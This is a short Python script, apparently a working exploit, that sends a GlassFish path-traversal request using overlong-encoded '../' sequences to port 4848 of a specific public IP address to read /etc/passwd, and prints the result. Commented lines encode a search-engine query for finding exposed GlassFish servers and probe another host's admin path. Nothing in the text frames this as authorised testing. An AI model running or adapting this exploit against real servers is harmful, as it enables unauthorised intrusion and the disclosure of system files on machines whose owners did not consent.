import base64

import requests
import ssl


from selenium import webdriver

# res = requests.get('http://demo.vikingsword.top:1234/xui/inbounds')
# print(res.content)

# str = 'glassfish && port=\"4848\"'
# r = base64.b64encode(str.encode('utf-8'))
# print(r)
# rs = base64.b64decode(r)
# print(rs)

url = 'https://104.245.88.41:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
# ssl_context = ssl.create_default_context()
# ssl_context.set_ciphers('HIGH:!DH')
# context = ssl._create_unverified_context()

res = requests.get(url, verify=False)
# res = requests.get(url, verify=False, context=context)

if res.status_code == 200:
    print(res.text)
else:
    print('request false')



